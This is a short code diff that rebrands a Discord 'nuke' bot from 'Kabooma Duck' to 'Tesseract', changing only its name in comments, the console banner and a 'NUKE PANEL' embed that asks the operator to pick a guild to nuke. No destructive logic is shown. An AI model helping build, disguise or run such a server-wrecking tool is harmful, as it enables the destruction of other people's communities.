@@ -1,7 +1,7 @@
-// Kabooma Duck v2.0 / index.js / Updated 7.25.2023
+// Tesseract v2.0 / index.js / Updated 7.25.2023
 // Bot Dependencies
 const { Client, Events, GatewayIntentBits, EmbedBuilder, Partials, ActionRowBuilder, StringSelectMenuBuilder, ActivityType } = require('discord.js')
-let { token, admins, botName, fakeServers, advancedOptions } = require('./config.json') // Kabooma Duck Config v2.0 / config.json / Updated 7.25.2023 / Check README for info
+let { token, admins, botName, fakeServers, advancedOptions } = require('./config.json') // Tesseract Config v2.0 / config.json / Updated 7.25.2023 / Check README for info
 const axios = require('axios').default 
 // CMD Dependencies
 const chalk = require('chalk')
@@ -42,7 +42,7 @@ function registercmds() {
 
 client.once(Events.ClientReady, c => {
     console.clear()
-	console.log(chalk.yellowBright(figlet.textSync('Kabooma Duck', { font: '4Max' })))
+	console.log(chalk.yellowBright(figlet.textSync('Tesseract', { font: '4Max' })))
     console.log(chalk.redBright(`Version 2.0 | Logged in as ${client.user.tag} / ${client.user.id}`))
     console.log(chalk.redBright('Press Ctrl+C to exit. | Admins may use ?secure in bot DMs'))
     registercmds()
@@ -102,10 +102,10 @@ client.on('messageCreate', async message => {
         }
 
         var embed = new EmbedBuilder()
-        .setTitle('KABOOMA DUCK NUKE PANEL')
-        .setAuthor({name: 'Kabooma Duck v2.0 by RatWithAFace'})
+        .setTitle('Tesseract NUKE PANEL')
+        .setAuthor({name: 'Tesseract v2.0 by RatWithAFace'})
         .setColor('#fc00bd')
-        .setDescription('Welcome to the Kabooma Duck Nuke Panel. Please select a guild to nuke.')
+        .setDescription('Welcome to the Tesseract Nuke Panel. Please select a guild to nuke.')
 
         var component = new ActionRowBuilder()
         .addComponents(
